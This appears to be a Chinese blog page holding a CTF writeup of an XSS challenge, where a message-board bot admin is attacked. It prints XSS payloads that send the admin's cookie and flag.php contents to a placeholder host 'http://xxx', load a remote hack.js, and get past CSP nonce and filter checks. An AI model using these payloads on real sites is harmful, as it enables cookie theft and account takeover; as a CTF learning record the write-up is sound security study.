@@ -1,0 +1,266 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="chrome=1">
+
+    
+
+    <title>
+      PwnHub 绝对防御 writeup | HeartSky&#39;s blog 
+    </title>
+
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    
+      <meta name="author" content="HeartSky">
+    
+    
+
+    <meta name="description" content="一道土师傅出的 xss 的题，因为一些细节没理解，没做出来，不过还是学到了挺多知识的。 打开页面，是一个留言板，有注册和登录功能，因为已经说了有 bot ，就不考虑 sql 注入的问题了。随便注册个账号登录进去可以发现是一个留言的功能，给自己留言得到 script on 会被替换为空，可以双写绕过，根据题目的说明12admin 刚刚完成了聊天版，会经常和大家聊天。http://52.80.63.9">
+<meta name="keywords" content="writeup,CTF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PwnHub 绝对防御 writeup | HeartSky&#39;s blog">
+<meta property="og:url" content="http://heartsky.info/2017/04/25/PwnHub-绝对防御-writeup/index.html">
+<meta property="og:site_name" content="HeartSky&#39;s blog">
+<meta property="og:description" content="一道土师傅出的 xss 的题，因为一些细节没理解，没做出来，不过还是学到了挺多知识的。 打开页面，是一个留言板，有注册和登录功能，因为已经说了有 bot ，就不考虑 sql 注入的问题了。随便注册个账号登录进去可以发现是一个留言的功能，给自己留言得到 script on 会被替换为空，可以双写绕过，根据题目的说明12admin 刚刚完成了聊天版，会经常和大家聊天。http://52.80.63.9">
+<meta property="og:updated_time" content="2017-11-15T06:18:36.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="PwnHub 绝对防御 writeup | HeartSky&#39;s blog">
+<meta name="twitter:description" content="一道土师傅出的 xss 的题，因为一些细节没理解，没做出来，不过还是学到了挺多知识的。 打开页面，是一个留言板，有注册和登录功能，因为已经说了有 bot ，就不考虑 sql 注入的问题了。随便注册个账号登录进去可以发现是一个留言的功能，给自己留言得到 script on 会被替换为空，可以双写绕过，根据题目的说明12admin 刚刚完成了聊天版，会经常和大家聊天。http://52.80.63.9">
+    
+    
+    
+      <link rel="icon" type="image/x-icon" href="/favicon.png">
+    
+    <link rel="stylesheet" href="/css/uno.css">
+    <link rel="stylesheet" href="/css/highlight.css">
+    <link rel="stylesheet" href="/css/archive.css">
+    <link rel="stylesheet" href="/css/china-social-icon.css">
+
+</head>
+<body>
+
+    <span class="mobile btn-mobile-menu">
+        <i class="icon icon-list btn-mobile-menu__icon"></i>
+        <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+    
+
+<header class="panel-cover panel-cover--collapsed">
+
+
+  <div class="panel-main">
+
+  
+    <div class="panel-main__inner panel-inverted">
+    <div class="panel-main__content">
+
+        
+
+        <h1 class="panel-cover__title panel-title"><a href="/" title="link to homepage">HeartSky&#39;s blog</a></h1>
+        <hr class="panel-cover__divider" />
+
+        
+        <p class="panel-cover__description">
+          在渗透之路上渐行渐远
+        </p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary" />
+        
+
+        <div class="navigation-wrapper">
+
+          <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+
+              
+                
+                <li class="navigation__item"><a href="/#blog" title="" class="blog-button">首页</a></li>
+              
+                
+                <li class="navigation__item"><a href="/about" title="" class="">关于</a></li>
+              
+                
+                <li class="navigation__item"><a href="/archive" title="" class="">归档</a></li>
+              
+                
+                <li class="navigation__item"><a href="/friends" title="" class="">友链</a></li>
+              
+
+            </ul>
+          </nav>
+
+          <!-- ----------------------------
+To add a new social icon simply duplicate one of the list items from below
+and change the class in the <i> tag to match the desired social network
+and then add your link to the <a>. Here is a full list of social network
+classes that you can use:
+
+    icon-social-500px
+    icon-social-behance
+    icon-social-delicious
+    icon-social-designer-news
+    icon-social-deviant-art
+    icon-social-digg
+    icon-social-dribbble
+    icon-social-facebook
+    icon-social-flickr
+    icon-social-forrst
+    icon-social-foursquare
+    icon-social-github
+    icon-social-google-plus
+    icon-social-hi5
+    icon-social-instagram
+    icon-social-lastfm
+    icon-social-linkedin
+    icon-social-medium
+    icon-social-myspace
+    icon-social-path
+    icon-social-pinterest
+    icon-social-rdio
+    icon-social-reddit
+    icon-social-skype
+    icon-social-spotify
+    icon-social-stack-overflow
+    icon-social-steam
+    icon-social-stumbleupon
+    icon-social-treehouse
+    icon-social-tumblr
+    icon-social-twitter
+    icon-social-vimeo
+    icon-social-xbox
+    icon-social-yelp
+    icon-social-youtube
+    icon-social-zerply
+    icon-mail
+
+-------------------------------->
+
+<!-- add social info here -->
+
+
+
+        </div>
+
+      </div>
+
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+
+    <div class="content-wrapper">
+        <div class="content-wrapper__inner entry">
+            
+
+<article class="post-container post-container--single">
+
+  <header class="post-header">
+    
+    <h1 class="post-title">PwnHub 绝对防御 writeup</h1>
+
+    
+
+    <div class="post-meta">
+      <time datetime="2017-04-25" class="post-meta__date date">2017-04-25</time> 
+
+      <span class="post-meta__tags tags">
+
+          
+
+          
+             &#8226; 标签:
+            <font class="tags">
+              <a class="tags-link" href="/tags/CTF/">CTF</a>, <a class="tags-link" href="/tags/writeup/">writeup</a>
+            </font>
+          
+
+      </span>
+    </div>
+    
+    
+
+  </header>
+
+  <section id="post-content" class="article-content post">
+    <p>一道土师傅出的 xss 的题，因为一些细节没理解，没做出来，不过还是学到了挺多知识的。</p>
+<p>打开页面，是一个留言板，有注册和登录功能，因为已经说了有 bot ，就不考虑 sql 注入的问题了。随便注册个账号登录进去可以发现是一个留言的功能，给自己留言得到 <code>script</code> <code>on</code> 会被替换为空，可以双写绕过，根据题目的说明<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin 刚刚完成了聊天版，会经常和大家聊天。</span><br><span class="line">http://52.80.63.91/</span><br></pre></td></tr></table></figure></p>
+<p>应该是要先打下管理员的 cookie<br>看下 csp<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">default-src &apos;self&apos;; script-src &apos;self&apos; &apos;unsafe-inline&apos; &apos;unsafe-eval&apos;; style-src &apos;self&apos; &apos;unsafe-inline&apos;;</span><br></pre></td></tr></table></figure></p>
+<p>可以执行 script 标签，发送下面的信息得到管理员 cookie<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">scrscriptipt</span>&gt;</span>locatioonn.href="http://xxx?cookie="+document.cookie<span class="tag">&lt;/<span class="name">scrscriptipt</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>(后来才发现我们的 cookie 都是 httponly，但是 bot 不是<br>xxx 是你的服务器或者 xss 平台地址<br>更改 cookie 登录管理员账号得到下面的信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Wow, good guys,maybe you want /adminshigesha233e3333#admin</span><br></pre></td></tr></table></figure></p>
+<p>手动访问了下，得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello,admin maybe something in flag.php</span><br></pre></td></tr></table></figure></p>
+<p>再去访问 flag.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hello, hacker, only admin can see it</span><br></pre></td></tr></table></figure></p>
+<p>那么就要管理员请求才可以喽，用下面的 payload 让 admin 请求 flag.php<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">scrscriptipt</span>&gt;</span></span><br><span class="line">			var xhr = new XMLHttpRequest();</span><br><span class="line">			xhr.open("GET", 'http://52.80.63.91/adminshigesha233e3333/flag.php', true);</span><br><span class="line">			xhr.oonnreadystatechange = functioonn()</span><br><span class="line">			&#123;</span><br><span class="line">				if(xhr.readyState == 4)</span><br><span class="line">				&#123;</span><br><span class="line">					var text = xhr.respoonnseText;</span><br><span class="line">					document.locatioonn = "http://xxx?a=text";</span><br><span class="line">			&#125;</span><br><span class="line">			xhr.send();</span><br><span class="line"><span class="tag">&lt;/<span class="name">scrscriptipt</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>得到下面的内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nothing here,╮(╯-╰)╭,what ever you try, only from adminshigesha233e3333 can read it...</span><br></pre></td></tr></table></figure></p>
+<p>一开始以为要设置 referer 头，用 xhr 的 setRequestHeader 设置但是没用<br>想到#后面的 admin，感觉有点奇怪，去看了下源码<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">'MO0VrFHgESrb'</span>&gt;</span><span class="undefined">document.write('Hello,' + unescape(location.hash.substring(1)) + '\r\n maybe something in flag.php')</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">'MO0VrFHgESrb'</span>&gt;</span><span class="undefined">console.log('bad boy!!')</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>可以看到是获取了#后面的值，并用 document.write 输出了出来，因为代码是在一行的，所以有了第一种方式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://52.80.63.91/adminshigesha233e3333/#&lt;script src=http://xxx/hack.js</span><br></pre></td></tr></table></figure></p>
+<p>这样就构造出了<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src="http://xxx/hack.js" maybe="" something="" in="" flag.php&lt;script="" nonce="A7Vlkv32ZI2g"&gt;console.log('bad boy!!')&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
+<p>这样的形式，吃掉了 script 开始的标签，这样就绕过了 nonce 的限制<br>然后还有第二种方式，也是最简单的一种方式，看下admin目录下的 csp<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">default-src &apos;self&apos;; script-src &apos;nonce-A7Vlkv32ZI2g&apos;;</span><br></pre></td></tr></table></figure></p>
+<p>可以构造一个 iframe 标签，这样就不用跨域了，可以直接读到 flag 的内容<br>payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://52.80.63.91/adminshigesha233e3333/#&lt;iframe src=&quot;./flag.php&quot;&gt; &quot;</span><br></pre></td></tr></table></figure></p>
+<p>最后也是最正确的解法是利用浏览器的缓存，我们可以在 csp 头中看到 script-src 只有 nonce 值符合才会允许执行，但是浏览器每次刷新 nonce 值都会变化，当时就想的是请求一次获取 nonce 值后，下次再访问不就变了吗，一直百思不得其解，怎么通过构造 nonce 值做出来，直到看到官方 wp，才知道是利用了浏览器的缓存机制，所以 csp 头一段时间(30s)内不会变，所以就可以通过构造 nonce 值的 script 标签执行 js 了。</p>
+<p>最后，无论是哪种方式，因为 admin 目录页面是禁止发跨域请求的，要想得到它的输出，可以通过留言的方式，找到了 /api/addmessage.php，用 xhr 发送请求就可以了</p>
+
+  </section>
+
+  
+  
+</article>
+
+
+            <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+<footer class="footer">
+    <span id="busuanzi_container_page_pv">
+      本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+    </span>
+<span id="busuanzi_container_site_uv">
+  本站访客数<span id="busuanzi_value_site_uv"></span>人次
+</span>
+    <span class="footer__copyright">&copy; 2016-2017. | 由<a href="https://hexo.io/">Hexo</a>强力驱动 | 主题<a href="https://github.com/someus/huno">Huno</a> | <a href="https://coding.net/u/HeartSky/p/HeartSky/git/pages">Hosted by Coding Pages</a></span>  
+</footer>
+
+        </div>
+    </div>
+
+    <!-- js files -->
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/main.js"></script>
+    <script src="/js/scale.fix.js"></script>
+    
+
+    
+
+    <script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <script type="text/javascript"> 
+        $(document).ready(function(){
+            MathJax.Hub.Config({ 
+                tex2jax: {inlineMath: [['$','$'],['[latex]','[/latex]'], ['\\(','\\)']]} 
+            });
+        });
+    </script>
+
+
+
+    
+
+    <script src="/js/awesome-toc.min.js"></script>
+    <script>
+        $(document).ready(function(){
+            $.awesome_toc({
+                overlay: true,
+                contentId: "post-content",
+            });
+        });
+    </script>
+
+
+    <script src="http://s11.cnzz.com/z_stat.php?id=1259147269&web_id=1259147269" language="JavaScript"></script>
+    
+    <!--kill ie6 -->
+<!--[if IE 6]>
+  <script src="//letskillie6.googlecode.com/svn/trunk/2/zh_CN.js"></script>
+<![endif]-->
+
+</body>
+</html>
